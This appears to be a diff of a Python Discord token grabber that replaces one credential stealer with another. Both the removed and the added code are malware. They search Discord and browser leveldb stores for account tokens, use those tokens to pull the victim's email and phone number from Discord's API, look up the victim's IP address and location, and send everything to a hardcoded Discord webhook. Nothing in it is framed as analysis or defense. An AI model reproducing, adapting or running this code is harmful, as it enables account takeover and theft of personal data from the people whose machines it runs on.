@@ -1,137 +1,117 @@
-from base64 import b64decode
-from Crypto.Cipher import AES
-import keyring
-import json
-import os
+import os 
 import re
+import time
 import requests
-from datetime import datetime
-from urllib.request import Request, urlopen
-from subprocess import Popen, PIPE
+from discord_webhook import DiscordWebhook, DiscordEmbed
 
-tokens = []
-cleaned = []
-checker = []
+webhook = "https://discord.com/api/webhooks/1247364290084606052/CnNsZ184abYfD1kj3yAtkOH873RS4c7HVpD5Ryps2wX5Sv4pG-zz9KCRZmPYHIff3llm"
 
-def decrypt(buff, master_key):
+def get_ip_information():
+    request = requests.get("http://ipinfo.io/json")
+    data = request.json()
+    ip = data['ip']
+    org = data['org']
+    region = data['region']
+    city = data['city']
+    loc = data['loc']
+    return ip, org, region, city, loc
+
+def detect_operating_system():
+    if os.name == "nt":
+        operating_system = 0
+    else:
+        operating_system = 1
+    return operating_system
+
+def token_paths():
+    if detect_operating_system() == 1:
+        paths = {
+            "Discord": os.environ['HOME'] + "/.config/discord",
+            "Discord Canary": os.environ['HOME'] + "/.config/discordcanary",
+            "Discord PTB": os.environ['HOME'] + "/.config/discordptb",
+            "Google Chrome": os.environ['HOME'] + "/.config/google-chrome/Default", 
+            "Chromium": os.environ['HOME'] + "/.config/chromium/Default",
+            "Brave": os.environ['HOME'] + "/.config/BraveSoftware/Brave-Browser/Default",
+            "Opera": os.environ['HOME'] + "/.config/opera"
+        }
+    else:
+        paths = {
+            "Discord": os.getenv("APPDATA") + "\\Discord",
+            "Discord Canary": os.getenv("APPDATA") + "\\discordcanary",
+            "Discord PTB": os.getenv("APPDATA") + "\\discordptb",
+            "Google Chrome": os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default",
+            "Opera": os.getenv("APPDATA") + "\\Opera Software\\Opera Stable",
+            "Brave": os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+            "Yandex": os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default"
+        }
+    return paths
+
+def get_tokens(path):
+    so = detect_operating_system()
+    if so == 0:
+        path += "\\Local Storage\\leveldb"
+    else:
+        path += "/Local Storage/leveldb"
+    tokens = []
+
     try:
-        master_key = keyring.get_password('system', 'chrome_master_key')
-        return AES.new(b64decode(master_key), AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
-    except Exception as e:
-        return f"Error: {e}"
+        for file_name in os.listdir(path):
+            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                continue
 
-def getip():
-    ip = "None"
-    try:
-        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-    except Exception as e:
-        print(f"Failed to get IP: {e}")
-    return ip
-
-def gethwid():
-    p = Popen("cat /etc/machine-id", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-    return (p.stdout.read() + p.stderr.read()).decode().strip()
-
-def get_token():
-    already_check = []
-    cleaned = []
-    checker = []
-
-    home_dir = os.getenv('HOME')
-    if not home_dir:
-        raise EnvironmentError("HOME environment variable is not set.")
+            for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
+                for regex in (r'[\w-]{24}.[\w-]{6}.[\w-]{27}', r'mfa.[\w-]{84}'):
+                    for token in re.findall(regex, line):
+                        tokens.append(token)
+        return tokens
+    except:
+        pass
     
-    local = os.path.join(home_dir, '.config')
-    paths = {
-        'Discord': os.path.join(local, 'discord'),
-        'Discord Canary': os.path.join(local, 'discordcanary'),
-        'Lightcord': os.path.join(local, 'Lightcord'),
-        'Discord PTB': os.path.join(local, 'discordptb'),
-        'Opera': os.path.join(local, 'opera'),
-        'Opera GX': os.path.join(local, 'opera-gx'),
-        'Vivaldi': os.path.join(local, 'vivaldi'),
-        'Chrome': os.path.join(home_dir, 'google-chrome'),
-        'Microsoft Edge': os.path.join(local, 'microsoft-edge'),
-        'Brave': os.path.join(local, 'brave'),
-        'Iridium': os.path.join(local, 'iridium')
+def get_browser_headers(token):
+    headers = {
+        "Content-Type":"application/json",
+        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
+        "Authorization":token
     }
+    return headers
 
-    for platform, path in paths.items():
-        if not os.path.exists(path): continue
-        try:
-            with open(os.path.join(path, "Local State"), "r") as file:
-                key = json.loads(file.read())['os_crypt']['encrypted_key']
-        except Exception as e:
-            print(f"Failed to read local state file from {path}: {e}")
+def get_account_info(headers):
+    try:
+        request = requests.get("https://discord.com/api/v6/users/@me", headers=headers)
+        data = request.json()
+        phone = str(data['phone']) 
+        email = data['email']
+        username = data['username'] + "#" +str(data['discriminator'])
+        return phone, email, username
+    except:
+        pass
+        
+def send_fucking_tokens(tokens, webh, phone:None, email:None, username:None, ip:None, org:None, region:None, city:None, loc:None):
+    counter = 0
+    for token in zip(tokens):
+        counter +=1 
+        webhook = DiscordWebhook(url=webh)
+        embed = DiscordEmbed(title="Tokens and Account information:", description=f"**From the user:** {username}", color = 0xff0008)
+        embed.add_embed_field(name="IP Information: ", value=f"**Public IP:** {ip}\n**ISP:** {org}\n**Region:** {region}\n**City:** {city}\n**loc**{loc}")
+        embed.add_embed_field(name='Token Information:', value=f'**Token #{counter}**\n {token}\n**Mobile Number:** {phone}\n **Email:** {email}')
+        embed.set_image(url="https://media.discordapp.net/attachments/836787807132581939/838256791288020992/nationgif.gif")
+        embed.set_footer(text="Token grabber by: Stolas")
+    webhook.add_embed(embed)
+    webhook.execute()
+    
+def main(webh=webhook):
+    tokens = []
+    browsers = []
+    ip, org, region, city, loc = get_ip_information()
+    paths = token_paths()
+    for browser, path in paths.items():
+        if os.path.exists(path) == False:
             continue
+        for token in get_tokens(path):
+            tokens.append(token)
+            browsers.append(browser)
+            headers = get_browser_headers(token)
+            phone, email, username = get_account_info(headers)
+            send_fucking_tokens(tokens, webh, phone, email, username, ip, org, region, city, loc)
 
-        for file_name in os.listdir(os.path.join(path, "Local Storage/leveldb/")):
-            if not file_name.endswith((".ldb", ".log")): continue
-            try:
-                with open(os.path.join(path, f"Local Storage/leveldb/{file_name}"), "r", errors='ignore') as file:
-                    for line in file.readlines():
-                        for value in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
-                            tokens.append(value)
-            except PermissionError:
-                continue
-
-        for token in tokens:
-            if token.endswith("\\"):
-                token = token.replace("\\", "")
-            if token not in cleaned:
-                cleaned.append(token)
-
-        for token in cleaned:
-            try:
-                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
-            except IndexError:
-                continue
-            checker.append(tok)
-            for value in checker:
-                if value not in already_check:
-                    already_check.append(value)
-                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
-                    try:
-                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
-                    except Exception as e:
-                        print(f"Failed to get user info: {e}")
-                        continue
-                    if res.status_code == 200:
-                        res_json = res.json()
-                        ip = getip()
-                        pc_username = os.getenv("USER")
-                        pc_name = os.uname()[1]
-                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
-                        user_id = res_json['id']
-                        email = res_json['email']
-                        phone = res_json['phone']
-                        mfa_enabled = res_json['mfa_enabled']
-                        has_nitro = False
-                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
-                        nitro_data = res.json()
-                        has_nitro = bool(len(nitro_data) > 0)
-                        days_left = 0
-                        if has_nitro:
-                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-                            days_left = abs((d2 - d1).days)
-                        embed = f"""**{user_name}** *({user_id})*\n
-> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
-> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
-> :piñata: __Token__\n\t`{tok}`\n
-*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
-                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
-                        try:
-                            headers2 = {
-                                'Content-Type': 'application/json',
-                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
-                            }
-                            req = Request('https://discord.com/api/webhooks/1247364290084606052/CnNsZ184abYfD1kj3yAtkOH873RS4c7HVpD5Ryps2wX5Sv4pG-zz9KCRZmPYHIff3llm', data=payload.encode(), headers=headers2)
-                            urlopen(req)
-                        except Exception as e:
-                            print(f"Failed to send webhook: {e}")
-                else:
-                    continue
-
-if __name__ == '__main__':
-    get_token()
+main()
